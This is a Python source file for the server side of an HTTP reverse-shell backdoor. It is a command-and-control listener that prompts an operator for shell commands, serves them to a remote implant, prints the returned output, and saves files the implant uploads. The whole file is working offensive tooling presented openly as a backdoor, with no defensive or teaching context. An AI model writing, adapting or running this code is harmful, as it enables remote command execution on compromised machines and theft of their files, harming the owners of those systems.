# HTTP Reverse shell Back-door script Server-side

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
import os
import cgi


HTTP_STATUS_OK = 200
SERVER_IP = "192.168.43.85"
SERVER_PORT = 8080

class MyHandler(BaseHTTPRequestHandler):
    
    def log_message(self,format,*args):
        pass
    def save_file(self, length):
        try:
            data = self.rfile.read(length).decode()
            ctype, pdict = cgi.parse_header(self.headers.get('Content-type'))
            if ctype == 'multipart/form-data':
                rfile = cgi.FieldStorage(
                    fb = self.rfile,
                    headers= self.headers,
                    environ= {'REQUEST_METHOD':'PORT'}
                )
                if "rfile" in rfile:
                    with open('/tmp/downloaded_file','wb') as output_file:
                        output_file.write(rfile["rfile"].file.read())
                    print("File saved as /tmp/downloaded_file")
            else:
                with open('/tmp/downloaded_file','wb') as output_file:
                    output_file.write(data.encode())
                print("File saved as /tmp/downloaded_file")
        except Exception as e:
            print(f"Error saving file: {e}")
            
    def do_GET(self):
        try:
            self.send_response(HTTP_STATUS_OK)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            command = input("Shell>> ")
            self.wfile.write(command.encode())
        except Exception as e:
            print(f"Error sending command: {e}")
            
            
    def do_POST(self):
        try:
            length = int(self.headers["Content-Length"])
            self.send_response(HTTP_STATUS_OK)
            self.end_headers()
            
            if self.path == "/ store":
                self.save_file(length)
            else:
                data = parse_qs(self.rfile.read(length).decode())
                if "rfile" in data:
                    print(data["rfile"][0])
        except Exception as e:
            print(f"Error receiving input: {e}")
            
if __name__ == "__main__":
    try:
        my_server = HTTPServer((SERVER_IP, SERVER_PORT),MyHandler)
        print(f"[*] Server started on {SERVER_IP}:{SERVER_PORT}")
        my_server.serve_forever()
    except KeyboardInterrupt:
        print("[!] Server is terminated")
        my_server.server_close()
    except Exception as e:
        print(f"Error starting server: {e}")